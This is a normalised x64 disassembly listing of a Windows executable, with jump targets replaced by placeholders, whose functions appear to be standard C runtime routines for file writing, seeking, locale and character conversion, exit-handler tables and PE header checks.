and [ rcx + 0xc8 ] 0xfffffffd
sub_140007738
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x60
movsxd rdi ecx
mov ebp edx
lea rcx [ rsp + 0x40 ]
mov rdx r8
call sub_1400023d8
lea r11d [ rdi + 0x1 ]
cmp r11d 0x100
ja r-xdata
mov esi edi
lea rdx [ rsp + 0x40 ]
sar esi 0x8
movzx ecx sil
call sub_1400076a8
mov edx 0x1
test eax eax
je r-xdata
mov rax [ rsp + 0x40 ]
mov rcx [ rax + 0x140 ]
movzx eax [ rcx + rdi * 2 ]
jmp r-xdata
mov [ rsp + 0x88 ] dil
mov [ rsp + 0x89 ] 0x0
mov r9d edx
mov [ rsp + 0x88 ] sil
mov [ rsp + 0x89 ] dil
mov [ rsp + 0x8a ] 0x0
lea r9d [ rdx + 0x1 ]
jmp r-xdata
and eax ebp
cmp [ rsp + 0x58 ] 0x0
je r-xdata
movzx eax [ rsp + 0x70 ]
cmp [ rsp + 0x58 ] al
je r-xdata
mov rcx [ rsp + 0x40 ]
mov [ rsp + 0x38 ] edx
lea r8 [ rsp + 0x88 ]
mov eax [ rcx + 0x14 ]
mov [ rsp + 0x30 ] eax
mov eax [ rcx + 0x4 ]
lea rcx [ rsp + 0x40 ]
mov [ rsp + 0x28 ] eax
lea rax [ rsp + 0x70 ]
mov [ rsp + 0x20 ] rax
call sub_1400066f4
test eax eax
jne r-xdata
lea r11 [ rsp + 0x60 ]
mov rbp [ r11 + 0x18 ]
mov rsi [ r11 + 0x20 ]
mov rsp r11
pop rdi
retn
mov rcx [ rsp + 0x50 ]
and [ rcx + 0xc8 ] 0xfffffffd
xor eax eax
jmp r-xdata
mov rax [ rsp + 0x50 ]
and [ rax + 0xc8 ] 0xfffffffd
sub_140007844
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
push rdi
sub rsp 0x50
mov esi edx
mov rdx rcx
lea rcx [ rax - 0x28 ]
mov rbx r9
mov edi r8d
call sub_1400023d8
mov r9d [ rsp + 0x80 ]
xor ebp ebp
cmp r9d ebp
jle r-xdata
mov eax [ rsp + 0x90 ]
mov r8 rbx
mov edx edi
mov [ rsp + 0x28 ] eax
mov rax [ rsp + 0x88 ]
mov ecx esi
mov [ rsp + 0x20 ] rax
call [ LCMapStringW@IAT ]
cmp [ rsp + 0x48 ] bpl
je r-xdata
mov eax r9d
mov rcx rbx
mov rbx [ rsp + 0x60 ]
mov rbp [ rsp + 0x68 ]
mov rsi [ rsp + 0x70 ]
add rsp 0x50
pop rdi
retn
mov rcx [ rsp + 0x40 ]
and [ rcx + 0xc8 ] 0xfffffffd
sub r9d eax
dec r9d
add rcx 0x2
cmp eax ebp
jne r-xdata
dec eax
cmp [ rcx ] bp
je r-xdata
or eax 0xffffffff
sub_1400078e8
mov [ rsp + 0x8 ] cx
push rbx
sub rsp 0x60
mov eax 0xffff
movzx ebx dx
cmp cx ax
jne r-xdata
mov eax 0x100
cmp cx ax
jae r-xdata
xor ecx ecx
mov ax cx
jmp r-xdata
lea rcx [ rsp + 0x40 ]
mov rdx r8
call sub_1400023d8
mov r11 [ rsp + 0x40 ]
mov edx 0x1
mov eax [ r11 + 0x14 ]
lea r8 [ rsp + 0x70 ]
lea rcx [ rsp + 0x40 ]
mov [ rsp + 0x30 ] eax
mov eax [ r11 + 0x4 ]
mov r9d edx
mov [ rsp + 0x28 ] eax
lea rax [ rsp + 0x78 ]
mov [ rsp + 0x20 ] rax
call sub_1400097c0
xor ecx ecx
cmp eax ecx
jne r-xdata
mov rax [ rw-data ]
movzx ecx cx
mov ax [ rax + rcx * 2 ]
and ax bx
jmp r-xdata
movzx eax ax
movzx ecx bx
and eax ecx
add rsp 0x60
pop rbx
retn
mov ax [ rsp + 0x78 ]
mov eax ecx
mov [ rsp + 0x78 ] cx
jmp r-xdata
mov rax [ rsp + 0x50 ]
and [ rax + 0xc8 ] 0xfffffffd
mov ax [ rsp + 0x78 ]
cmp [ rsp + 0x58 ] cl
je r-xdata
sub_1400079a4
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
movsxd rbx ecx
mov edi r8d
mov [ rsp + 0x38 ] rdx
mov ecx ebx
call sub_1400098d0
cmp rax 0xffffffffffffffff
jne r-xdata
mov edx [ rsp + 0x38 ]
lea r8 [ rsp + 0x3c ]
mov r9d edi
mov rcx rax
call [ SetFilePointer@IAT ]
mov [ rsp + 0x38 ] eax
cmp eax 0xffffffff
jne r-xdata
call sub_140003b30
mov [ rax ] 0x9
mov rcx rbx
mov rax rbx
lea rdx [ rw-data ]
sar rax 0x5
and ecx 0x1f
mov rax [ rdx + rax * 8 ]
imul rcx rcx 0x58
and [ rax + rcx + 0x8 ] 0xfd
mov rax [ rsp + 0x38 ]
call [ GetLastError@IAT ]
test eax eax
je r-xdata
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov ecx eax
call sub_140003b70
jmp r-xdata
or rax 0xffffffffffffffff
jmp r-xdata
sub_140007a3c
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rsi
mov [ rsp + 0x8 ] ecx
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x30
mov r12d r8d
mov r13 rdx
movsxd rbx ecx
cmp ebx 0xfffffffe
jne r-xdata
xor edi edi
cmp ebx edi
jl r-xdata
call sub_140003b50
xor edi edi
mov [ rax ] edi
call sub_140003b30
mov [ rax ] 0x9
or rax 0xffffffffffffffff
jmp r-xdata
call sub_140003b50
mov [ rax ] edi
call sub_140003b30
mov [ rax ] 0x9
mov [ rsp + 0x20 ] rdi
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_140003a60
or rax 0xffffffffffffffff
cmp ebx [ rw-data ]
jae r-xdata
mov rbx [ rsp + 0x68 ]
mov rsi [ rsp + 0x70 ]
add rsp 0x30
pop r15
pop r14
pop r13
pop r12
pop rdi
retn
mov rsi rbx
mov r14 rbx
sar r14 0x5
lea r15 [ rw-data ]
and esi 0x1f
imul rsi rsi 0x58
mov rax [ r15 + r14 * 8 ]
movsx ecx [ rax + rsi + 0x8 ]
and ecx 0x1
jne r-xdata
mov ecx ebx
call sub_140009954
nop
mov rax [ r15 + r14 * 8 ]
test [ rax + rsi + 0x8 ] 0x1
je r-xdata
call sub_140003b50
mov [ rax ] edi
call sub_140003b30
mov [ rax ] 0x9
mov [ rsp + 0x20 ] rdi
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_140003a60
or rax 0xffffffffffffffff
jmp r-xdata
call sub_140003b30
mov [ rax ] 0x9
call sub_140003b50
mov [ rax ] edi
or rdi 0xffffffffffffffff
mov r8d r12d
mov rdx r13
mov ecx ebx
call sub_1400079a4
mov rdi rax
jmp r-xdata
mov ecx ebx
call sub_1400099fc
mov rax rdi
jmp r-xdata
sub_140007b74
mov [ rsp + 0x20 ] rbx
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
mov eax 0x1b30
call sub_14000a7a0
sub rsp rax
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x1b20 ] rax
xor ebp ebp
xor edi edi
mov r13d r8d
mov r12 rdx
movsxd rbx ecx
mov [ rsp + 0x40 ] ebp
test r8d r8d
jne r-xdata
test rdx rdx
jne r-xdata
xor eax eax
jmp r-xdata
mov r15 rbx
mov r14 rbx
lea rax [ rw-data ]
sar r14 0x5
and r15d 0x1f
mov rcx [ rax + r14 * 8 ]
mov [ rsp + 0x50 ] r14
imul r15 r15 0x58
mov sil [ r15 + rcx + 0x38 ]
add sil sil
sar sil 0x1
cmp sil 0x2
je r-xdata
call sub_140003b50
and [ rax ] edi
call sub_140003b30
and [ rsp + 0x20 ] rdi
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rax ] 0x16
call sub_140003a60
mov rcx [ rsp + 0x1b20 ]
xor rcx rsp
call sub_140002370
mov rbx [ rsp + 0x1b88 ]
add rsp 0x1b30
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
mov eax r13d
not eax
test al 0x1
je r-xdata
cmp sil 0x1
jne r-xdata
test [ r15 + rcx + 0x8 ] 0x20
je r-xdata
mov ecx ebx
call sub_14000845c
test eax eax
je r-xdata
xor edx edx
mov ecx ebx
lea r8d [ rdx + 0x2 ]
call sub_1400079a4
lea rax [ rw-data ]
mov rcx [ rax + r14 * 8 ]
test [ r15 + rcx + 0x8 ] 0x80
je r-xdata
lea rax [ rw-data ]
mov rax [ rax + r14 * 8 ]
test [ r15 + rax + 0x8 ] 0x80
je r-xdata
mov rcx [ r15 + rcx ]
and [ rsp + 0x20 ] rdi
lea r9 [ rsp + 0x48 ]
mov r8d r13d
mov rdx r12
call [ WriteFile@IAT ]
test eax eax
je r-xdata
xor ebx ebx
mov rbp r12
test sil sil
jne r-xdata
call sub_140003750
xor ebx ebx
lea rdx [ rsp + 0x58 ]
mov rcx [ rax + 0xc0 ]
lea rax [ rw-data ]
cmp [ rcx + 0x14 ] ebx
mov rcx [ rax + r14 * 8 ]
mov rcx [ r15 + rcx ]
sete bl
call [ GetConsoleMode@IAT ]
test eax eax
je r-xdata
call [ GetLastError@IAT ]
mov ebx eax
jmp r-xdata
mov edi [ rsp + 0x48 ]
xor ebx ebx
jmp r-xdata
cmp sil 0x2
jne r-xdata
test r13d r13d
je r-xdata
test ebx ebx
je r-xdata
test edi edi
jne r-xdata
test r13d r13d
je r-xdata
test r13d r13d
je r-xdata
mov rax [ rax + r14 * 8 ]
test [ r15 + rax + 0x8 ] 0x40
je r-xdata
lea edx [ rbx + 0xd ]
call [ GetConsoleCP@IAT ]
and [ rsp + 0x4c ] edi
mov rbx r12
mov [ rsp + 0x58 ] eax
test r13d r13d
je r-xdata
test sil sil
je r-xdata
sub edi ebp
mov eax edi
test ebx ebx
je r-xdata
mov r8d 0xd
mov edx 0xd
call sub_140003b30
mov [ rax ] 0x1c
call sub_140003b50
and [ rax ] 0x0
jmp r-xdata
cmp [ r12 ] 0x1a
je r-xdata
and [ rsp + 0x20 ] rbx
lea rax [ rsp + 0x720 ]
mov r8d esi
sub r8d eax
lea rax [ rw-data ]
mov [ rsp + 0x40 ] r14d
mov r14 [ rsp + 0x50 ]
lea r9 [ rsp + 0x48 ]
lea rdx [ rsp + 0x720 ]
mov rcx [ rax + r14 * 8 ]
mov rcx [ r15 + rcx ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov al [ rbp ]
inc rbp
cmp al 0xa
jne r-xdata
mov ebx [ rsp + 0x4c ]
jmp r-xdata
mov r14d [ rsp + 0x58 ]
mov ebp 0xd
lea rax [ rw-data ]
cmp ebx 0x5
jne r-xdata
and [ rsp + 0x38 ] 0x0
and [ rsp + 0x30 ] 0x0
lea rax [ rsp + 0x70 ]
sub ecx eax
lea r8 [ rsp + 0x70 ]
mov [ rsp + 0x28 ] 0xd55
mov eax ecx
mov ecx 0xfde9
cdq
sub eax edx
xor edx edx
sar eax 0x1
mov r9d eax
lea rax [ rsp + 0x720 ]
mov [ rsp + 0x20 ] rax
call [ WideCharToMultiByte@IAT ]
mov r14d eax
test eax eax
je r-xdata
movzx eax [ rbp ]
add rbp 0x2
cmp ax 0xa
jne r-xdata
and [ rsp + 0x20 ] rbx
lea rax [ rsp + 0x720 ]
mov r8d esi
sub r8d eax
lea rax [ rw-data ]
mov [ rsp + 0x40 ] r14d
mov r14 [ rsp + 0x50 ]
lea r9 [ rsp + 0x48 ]
lea rdx [ rsp + 0x720 ]
mov rcx [ rax + r14 * 8 ]
mov rcx [ r15 + rcx ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
movzx eax [ rbp ]
add rbp 0x2
cmp ax 0xa
jne r-xdata
or eax 0xffffffff
jmp r-xdata
call [ GetLastError@IAT ]
mov ebx eax
jmp r-xdata
add edi [ rsp + 0x48 ]
lea rax [ rsp + 0x720 ]
sub rsi rax
movsxd rax [ rsp + 0x48 ]
cmp rax rsi
jl r-xdata
inc rcx
mov [ rsi ] al
inc rsi
cmp rcx 0x13ff
jb r-xdata
mov [ rsi ] dl
inc r14d
inc rsi
inc rcx
cmp sil 0x1
je r-xdata
mov rdx [ rsp + 0x50 ]
mov cl [ rbx ]
xor r14d r14d
cmp cl 0xa
lea rbp [ rw-data ]
mov rdx [ rbp + rdx * 8 ]
sete r14b
cmp [ r15 + rdx + 0x50 ] 0x0
je r-xdata
mov ecx ebx
call sub_140003b70
jmp r-xdata
call sub_140003b30
mov [ rax ] 0x9
call sub_140003b50
mov [ rax ] ebx
jmp r-xdata
call [ GetLastError@IAT ]
mov ebx eax
jmp r-xdata
xor esi esi
add rdx 0x2
mov [ rcx ] ax
add rcx 0x2
cmp rdx 0x6a8
jb r-xdata
mov [ rcx ] r8w
add rcx 0x2
add rdx 0x2
add edi [ rsp + 0x48 ]
lea rax [ rsp + 0x720 ]
sub rsi rax
movsxd rax [ rsp + 0x48 ]
cmp rax rsi
jl r-xdata
add rcx 0x2
mov [ rsi ] ax
add rsi 0x2
cmp rcx 0x13fe
jb r-xdata
mov [ rsi ] dx
add r14d 0x2
add rsi 0x2
add rcx 0x2
mov ebp [ rsp + 0x40 ]
mov eax ebp
mov edx 0xd
sub eax r12d
cmp eax r13d
jb r-xdata
mov eax ebp
sub eax r12d
cmp eax r13d
jae r-xdata
movzx eax [ rbx ]
xor r14d r14d
cmp ax 0xa
mov [ rsp + 0x44 ] ax
sete r14b
add rbx 0x2
cmp sil 0x2
jne r-xdata
movsx ecx cl
call sub_1400076f0
test eax eax
je r-xdata
mov al [ r15 + rdx + 0x4c ]
mov [ rsp + 0x5d ] cl
mov r8d 0x2
mov [ rsp + 0x5c ] al
and [ r15 + rdx + 0x50 ] 0x0
lea rdx [ rsp + 0x5c ]
jmp r-xdata
mov r14 [ rsp + 0x50 ]
call [ GetLastError@IAT ]
mov ebx eax
add esi [ rsp + 0x48 ]
cmp r14d esi
jg r-xdata
mov eax ebp
sub eax r12d
cmp eax r13d
jae r-xdata
mov eax ebp
mov edx 0xd
sub eax r12d
cmp eax r13d
jb r-xdata
mov eax ebp
sub eax r12d
cmp eax r13d
jae r-xdata
mov r14d [ rsp + 0x40 ]
lea rsi [ rsp + 0x720 ]
xor ecx ecx
jmp r-xdata
movzx ecx [ rsp + 0x44 ]
call sub_140009a24
cmp ax [ rsp + 0x44 ]
jne r-xdata
cmp sil 0x2
jne r-xdata
cmp sil 0x1
je r-xdata
mov r8d 0x1
mov rdx rbx
mov rax r13
sub rax rbx
add rax r12
cmp rax 0x1
jle r-xdata
lea rcx [ rsp + 0x44 ]
call sub_140009cac
cmp eax 0xffffffff
je r-xdata
mov edi ebp
mov r8d 0xd
sub edi r12d
cmp edi r13d
jb r-xdata
mov rax [ rsp + 0x50 ]
and [ rsp + 0x20 ] 0x0
movsxd rcx esi
lea rdx [ rsp + rcx + 0x720 ]
mov r8d r14d
lea rcx [ rw-data ]
mov rcx [ rcx + rax * 8 ]
lea r9 [ rsp + 0x48 ]
sub r8d esi
mov rcx [ r15 + rcx ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
jmp r-xdata
mov r14d [ rsp + 0x40 ]
lea rsi [ rsp + 0x720 ]
xor ecx ecx
jmp r-xdata
add edi 0x2
test r14d r14d
je r-xdata
mov eax ebx
sub eax r12d
cmp eax r13d
jb r-xdata
mov ebx [ rsp + 0x4c ]
and [ rsp + 0x38 ] 0x0
and [ rsp + 0x30 ] 0x0
mov ecx [ rsp + 0x58 ]
lea rax [ rsp + 0x5c ]
lea r8 [ rsp + 0x44 ]
mov r9d 0x1
xor edx edx
mov [ rsp + 0x28 ] 0x5
inc rbx
mov [ rsp + 0x20 ] rax
call [ WideCharToMultiByte@IAT ]
mov ebp eax
test eax eax
je r-xdata
mov al [ rbx ]
mov r14 [ rsp + 0x50 ]
inc edi
mov rcx [ rbp + r14 * 8 ]
mov [ r15 + rcx + 0x4c ] al
mov rax [ rbp + r14 * 8 ]
mov [ r15 + rax + 0x50 ] 0x1
mov ebx [ rsp + 0x4c ]
jmp r-xdata
lea rcx [ rsp + 0x44 ]
mov r8d 0x2
mov rdx rbx
call sub_140009cac
cmp eax 0xffffffff
je r-xdata
lea rcx [ rsp + 0x70 ]
xor edx edx
jmp r-xdata
cmp r14d esi
jg r-xdata
mov ecx ebp
mov [ rsp + 0x44 ] bp
call sub_140009a24
cmp ax [ rsp + 0x44 ]
jne r-xdata
test sil sil
jne r-xdata
mov rax [ rsp + 0x50 ]
and [ rsp + 0x20 ] 0x0
lea rcx [ rw-data ]
mov rcx [ rcx + rax * 8 ]
lea r9 [ rsp + 0x4c ]
lea rdx [ rsp + 0x5c ]
mov rcx [ r15 + rcx ]
mov r8d ebp
call [ WriteFile@IAT ]
test eax eax
je r-xdata
inc rbx
jmp r-xdata
inc edi
inc [ rsp + 0x40 ]
mov edi ebx
sub edi r12d
add edi [ rsp + 0x40 ]
cmp [ rsp + 0x4c ] ebp
jl r-xdata
mov ebp 0xd
test r14d r14d
je r-xdata
mov rax [ rsp + 0x50 ]
and [ rsp + 0x20 ] 0x0
mov [ rsp + 0x5c ] bpl
lea rcx [ rw-data ]
lea r9 [ rsp + 0x4c ]
lea r8d [ rbp - 0xc ]
mov rcx [ rcx + rax * 8 ]
lea rdx [ rsp + 0x5c ]
mov rcx [ r15 + rcx ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
cmp [ rsp + 0x4c ] 0x1
jl r-xdata
inc [ rsp + 0x40 ]
inc edi
jmp r-xdata
sub_1400082d4
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rsi
mov [ rsp + 0x8 ] ecx
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x30
mov r12d r8d
mov r13 rdx
movsxd rbx ecx
cmp ebx 0xfffffffe
jne r-xdata
xor edi edi
cmp ebx edi
jl r-xdata
call sub_140003b50
xor edi edi
mov [ rax ] edi
call sub_140003b30
mov [ rax ] 0x9
or eax 0xffffffff
jmp r-xdata
call sub_140003b50
mov [ rax ] edi
call sub_140003b30
mov [ rax ] 0x9
mov [ rsp + 0x20 ] rdi
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_140003a60
or eax 0xffffffff
cmp ebx [ rw-data ]
jae r-xdata
mov rbx [ rsp + 0x68 ]
mov rsi [ rsp + 0x70 ]
add rsp 0x30
pop r15
pop r14
pop r13
pop r12
pop rdi
retn
mov rsi rbx
mov r14 rbx
sar r14 0x5
lea r15 [ rw-data ]
and esi 0x1f
imul rsi rsi 0x58
mov rax [ r15 + r14 * 8 ]
movsx ecx [ rax + rsi + 0x8 ]
and ecx 0x1
jne r-xdata
mov ecx ebx
call sub_140009954
nop
mov rax [ r15 + r14 * 8 ]
test [ rax + rsi + 0x8 ] 0x1
je r-xdata
call sub_140003b50
mov [ rax ] edi
call sub_140003b30
mov [ rax ] 0x9
mov [ rsp + 0x20 ] rdi
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_140003a60
or eax 0xffffffff
jmp r-xdata
call sub_140003b30
mov [ rax ] 0x9
call sub_140003b50
mov [ rax ] edi
or edi 0xffffffff
mov r8d r12d
mov rdx r13
mov ecx ebx
call sub_140007b74
mov edi eax
jmp r-xdata
mov ecx ebx
call sub_1400099fc
mov eax edi
jmp r-xdata
sub_140008408
push rbx
sub rsp 0x20
inc [ rw-data ]
mov rbx rcx
mov ecx 0x1000
call sub_140006a14
mov [ rbx + 0x10 ] rax
test rax rax
je r-xdata
or [ rbx + 0x18 ] 0x4
lea rax [ rbx + 0x20 ]
mov [ rbx + 0x24 ] 0x2
mov [ rbx + 0x10 ] rax
or [ rbx + 0x18 ] 0x8
mov [ rbx + 0x24 ] 0x1000
jmp r-xdata
mov rax [ rbx + 0x10 ]
and [ rbx + 0x8 ] 0x0
mov [ rbx ] rax
add rsp 0x20
pop rbx
retn
sub_14000845c
sub rsp 0x38
cmp ecx 0xfffffffe
jne r-xdata
test ecx ecx
js r-xdata
call sub_140003b30
mov [ rax ] 0x9
jmp r-xdata
call sub_140003b30
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rax ] 0x9
call sub_140003a60
cmp ecx [ rw-data ]
jae r-xdata
xor eax eax
movsxd rcx ecx
lea rdx [ rw-data ]
mov rax rcx
and ecx 0x1f
sar rax 0x5
imul rcx rcx 0x58
mov rax [ rdx + rax * 8 ]
movsx eax [ rax + rcx + 0x8 ]
and eax 0x40
jmp r-xdata
add rsp 0x38
retn
sub_1400084d4
push rbx
sub rsp 0x20
mov eax [ rw-data ]
mov ebx 0x14
test eax eax
jne r-xdata
cmp eax ebx
cmovl eax ebx
mov eax 0x200
jmp r-xdata
xor ecx ecx
lea rdx [ rw-data ]
lea edx [ rax + 0x8 ]
mov rcx rbx
mov [ rw-data ] ebx
call sub_140006a80
mov [ rw-data ] rax
test rax rax
jne r-xdata
movsxd rcx eax
mov edx 0x8
mov [ rw-data ] eax
call sub_140006a80
mov [ rw-data ] rax
test rax rax
jne r-xdata
xor r8d r8d
lea rdx [ rw-data ]
lea r9d [ r8 + 0x3 ]
mov rax [ rw-data ]
jmp r-xdata
mov eax 0x1a
jmp r-xdata
mov [ rdx ] 0xfffffffe
cmp r10 0xfffffffffffffffe
je r-xdata
mov [ rcx + rax ] rdx
add rdx 0x30
add rcx 0x8
sub rbx 0x1
je r-xdata
add rsp 0x20
pop rbx
retn
mov rcx r8
lea r10 [ rw-data ]
mov rax r8
sar rax 0x5
and ecx 0x1f
mov rax [ r10 + rax * 8 ]
imul rcx rcx 0x58
mov r10 [ rcx + rax ]
cmp r10 0xffffffffffffffff
je r-xdata
xor eax eax
test r10 r10
jne r-xdata
inc r8
add rdx 0x30
sub r9 0x1
jne r-xdata
sub_1400085e0
push rbx
sub rsp 0x20
mov rbx rcx
lea rcx [ rw-data ]
cmp rbx rcx
jb r-xdata
lea rcx [ rbx + 0x30 ]
call [ EnterCriticalSection@IAT ]
lea rax [ rw-data ]
cmp rbx rax
ja r-xdata
mov rdx rbx
mov rax 0x2aaaaaaaaaaaaaab
sub rdx rcx
imul rdx
sar rdx 0x3
mov rcx rdx
shr rcx 0x3f
lea ecx [ rcx + rdx + 0x10 ]
call sub_140006990
bts [ rbx + 0x18 ] 0xf
jmp r-xdata
add rsp 0x20
pop rbx
retn
sub_140008640
push rbx
sub rsp 0x20
cmp ecx 0x14
mov rbx rdx
jge r-xdata
lea rcx [ rdx + 0x30 ]
call [ EnterCriticalSection@IAT ]
add ecx 0x10
call sub_140006990
bts [ rbx + 0x18 ] 0xf
jmp r-xdata
add rsp 0x20
pop rbx
retn
sub_140008670
sub rsp 0x28
lea rdx [ rw-data ]
cmp rcx rdx
jb r-xdata
add rcx 0x30
call [ LeaveCriticalSection@IAT ]
lea rax [ rw-data ]
cmp rcx rax
ja r-xdata
btr [ rcx + 0x18 ] 0xf
sub rcx rdx
mov rax 0x2aaaaaaaaaaaaaab
imul rcx
sar rdx 0x3
mov rcx rdx
shr rcx 0x3f
lea ecx [ rcx + rdx + 0x10 ]
call sub_140006890
jmp r-xdata
add rsp 0x28
retn
sub_1400086f0
sub rsp 0x38
test rcx rcx
jne r-xdata
mov eax [ rcx + 0x1c ]
call sub_140003b30
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rax ] 0x16
call sub_140003a60
or eax 0xffffffff
jmp r-xdata
add rsp 0x38
retn
sub_140008728
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
lea rbx [ rw-data ]
mov edi 0xa
mov rcx [ rbx ]
call __imp_EncodePointer
mov [ rbx ] rax
add rbx 0x8
sub rdi 0x1
jne r-xdata
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
sub_140008778
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x20 ] r9w
push rbp
push rsi
push rdi
sub rsp 0x60
xor ebp ebp
mov rdi r8
mov rsi rdx
mov rbx rcx
cmp rdx rbp
jne r-xdata
cmp rcx rbp
je r-xdata
cmp r8 rbp
jbe r-xdata
cmp r8 0x7fffffff
jbe r-xdata
or [ rcx ] 0xffffffff
cmp rcx rbp
je r-xdata
mov rdx [ rsp + 0xa0 ]
lea rcx [ rsp + 0x40 ]
call sub_1400023d8
mov r11 [ rsp + 0x40 ]
cmp [ r11 + 0x14 ] ebp
jne r-xdata
call sub_140003b30
mov ebx 0x16
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rax ] ebx
mov [ rsp + 0x20 ] rbp
call sub_140003a60
xor eax eax
jmp r-xdata
mov [ rcx ] ebp
lea rax [ rsp + 0x88 ]
mov [ rsp + 0x88 ] ebp
mov ecx [ r11 + 0x4 ]
mov [ rsp + 0x38 ] rax
mov [ rsp + 0x30 ] rbp
lea r8 [ rsp + 0x98 ]
mov r9d 0x1
xor edx edx
mov [ rsp + 0x28 ] edi
mov [ rsp + 0x20 ] rsi
call [ WideCharToMultiByte@IAT ]
cmp eax ebp
je r-xdata
movzx eax [ rsp + 0x98 ]
mov ecx 0xff
cmp ax cx
jbe r-xdata
mov rbx [ rsp + 0x80 ]
add rsp 0x60
pop rdi
pop rsi
pop rbp
retn
call [ GetLastError@IAT ]
cmp eax 0x7a
jne r-xdata
cmp [ rsp + 0x88 ] ebp
jne r-xdata
cmp rsi rbp
je r-xdata
cmp rsi rbp
je r-xdata
call sub_140003b30
mov [ rax ] 0x2a
call sub_140003b30
mov eax [ rax ]
cmp [ rsp + 0x58 ] bpl
je r-xdata
cmp rsi rbp
je r-xdata
cmp rbx rbp
je r-xdata
cmp rbx rbp
je r-xdata
cmp rdi rbp
ja r-xdata
cmp rdi rbp
jbe r-xdata
mov rcx [ rsp + 0x50 ]
and [ rcx + 0xc8 ] 0xfffffffd
call sub_140003b30
mov ebx 0x22
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rax ] ebx
mov [ rsp + 0x20 ] rbp
call sub_140003a60
cmp [ rsp + 0x58 ] bpl
je r-xdata
cmp rdi rbp
jbe r-xdata
cmp [ rsp + 0x58 ] bpl
je r-xdata
mov [ rbx ] eax
jmp r-xdata
mov [ rbx ] 0x1
mov [ rsi ] al
call sub_140003b30
mov ebx 0x22
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rax ] ebx
mov [ rsp + 0x20 ] rbp
call sub_140003a60
cmp [ rsp + 0x58 ] bpl
je r-xdata
mov r8 rdi
xor edx edx
mov rcx rsi
call sub_140005d40
mov eax ebx
jmp r-xdata
mov rax [ rsp + 0x50 ]
and [ rax + 0xc8 ] 0xfffffffd
jmp r-xdata
mov r8 rdi
xor edx edx
mov rcx rsi
call sub_140005d40
mov rax [ rsp + 0x50 ]
and [ rax + 0xc8 ] 0xfffffffd
jmp r-xdata
mov rcx [ rsp + 0x50 ]
and [ rcx + 0xc8 ] 0xfffffffd
jmp r-xdata
sub_1400089dc
push rbx
sub rsp 0x20
mov edx 0x8
lea ecx [ rdx + 0x18 ]
call sub_140006a80
mov rcx rax
mov rbx rax
call __imp_EncodePointer
mov [ rw-data ] rax
mov [ rw-data ] rax
test rbx rbx
jne r-xdata
and [ rbx ] 0x0
xor eax eax
lea eax [ rbx + 0x18 ]
jmp r-xdata
add rsp 0x20
pop rbx
retn
sub_140008a20
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
mov [ rsp + 0x18 ] rdi
push r12
push r13
push r14
sub rsp 0x20
mov r14 rcx
call sub_140004b28
nop
mov rcx [ rw-data ]
call DecodePointer
mov r12 rax
mov rcx [ rw-data ]
call DecodePointer
mov rbx rax
cmp rax r12
jb r-xdata
xor ebx ebx
mov rdi rax
sub rdi r12
lea r13 [ rdi + 0x8 ]
cmp r13 0x8
jb r-xdata
mov rcx r12
call sub_14000a28c
mov rsi rax
cmp rax r13
jae r-xdata
mov rcx r14
call __imp_EncodePointer
mov [ rbx ] rax
lea rcx [ rbx + 0x8 ]
call EncodePointer
mov [ rw-data ] rax
mov rbx r14
jmp r-xdata
mov edx 0x1000
cmp rax rdx
cmovb rdx rax
add rdx rax
cmp rdx rax
jb r-xdata
call sub_140004b34
mov rax rbx
mov rbx [ rsp + 0x40 ]
mov rsi [ rsp + 0x48 ]
mov rdi [ rsp + 0x50 ]
add rsp 0x20
pop r14
pop r13
pop r12
retn
xor ebx ebx
mov rcx r12
call sub_140006b04
xor ebx ebx
cmp rax rbx
jne r-xdata
mov rcx r12
call sub_140006b04
cmp rax rbx
je r-xdata
sar rdi 0x3
lea rbx [ rax + rdi * 8 ]
mov rcx rax
call EncodePointer
mov [ rw-data ] rax
jmp r-xdata
lea rdx [ rsi + 0x20 ]
cmp rdx rsi
jb r-xdata
sub_140008b40
mov rax rcx
mov ecx 0x5a4d
cmp [ rax ] cx
je r-xdata
movsxd rcx [ rax + 0x3c ]
add rcx rax
xor eax eax
cmp [ rcx ] 0x4550
jne r-xdata
xor eax eax
retn
retn
mov edx 0x20b
cmp [ rcx + 0x18 ] dx
sete al
sub_140008b70
movsxd r8 [ rcx + 0x3c ]
xor r9d r9d
mov r10 rdx
add r8 rcx
movzx eax [ r8 + 0x14 ]
movzx r11d [ r8 + 0x6 ]
lea rcx [ rax + r8 + 0x18 ]
test r11d r11d
je r-xdata
xor eax eax
retn
mov edx [ rcx + 0xc ]
cmp r10 rdx
jb r-xdata
inc r9d
add rcx 0x28
cmp r9d r11d
jb r-xdata
mov eax [ rcx + 0x8 ]
add eax edx
cmp r10 rax
jb r-xdata
mov rax rcx
retn
sub_140008bc0
